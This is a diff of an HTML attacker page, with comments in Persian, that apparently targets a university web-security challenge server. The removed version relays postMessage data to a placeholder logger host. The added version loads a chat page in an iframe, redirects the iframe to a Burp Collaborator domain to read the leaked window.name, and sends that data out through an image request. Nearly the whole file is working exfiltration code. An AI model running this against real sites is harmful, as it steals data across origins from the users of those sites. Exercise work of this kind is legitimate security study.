@@ -1,22 +1,35 @@
-<!-- attacker.html -->
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Window.name Exfil</title>
+  </head>
   <body>
-    <h1>Hacking Owley...</h1>
-    <iframe id="victim" src="https://gameserver.websec.saarland/owley" style="width:100%; height:500px;"></iframe>
+    <h1>Loading Chat...</h1>
+    <iframe id="frame" width="600" height="400"></iframe>
 
     <script>
-      // شنیدن پیام از iframe
-      window.addEventListener("message", function(event) {
-        console.log("[+] Got message from iframe:", event.data);
-        fetch("https://your-logger.com/log?data=" + encodeURIComponent(event.data));
-      });
+      const iframe = document.getElementById('frame');
 
-      // ارسال پیام تست به iframe
+      // مرحله اول: باز کردن صفحه‌ی چت
+      iframe.src = 'https://gameserver.websec.saarland/chat';
+
+      // بعد از 4 ثانیه، URL رو عوض کن به یه صفحه از دامنه ما (تا SOP اجازه بده name رو بخونیم)
       setTimeout(() => {
-        document.getElementById("victim").contentWindow.postMessage("hi from attacker", "*");
-      }, 2000);
+        iframe.src = 'https://0ghj7ax4p9pg0zr3v94kctd6sxyomea3.oastify.com/';
+
+        // بعد از 2 ثانیه، window.name رو بخون و با تصویر به Burp بفرست
+        setTimeout(() => {
+          try {
+            const data = iframe.contentWindow.name;
+            console.log("Leaked window.name:", data);
+
+            // فرستادن اطلاعات به Burp از طریق بارگذاری تصویر
+            new Image().src = `https://0ghj7ax4p9pg0zr3v94kctd6sxyomea3.oastify.com/leak?data=` + encodeURIComponent(data);
+          } catch (err) {
+            console.error("Can't access window.name due to SOP", err);
+          }
+        }, 2000);
+      }, 4000);
     </script>
   </body>
 </html>
-
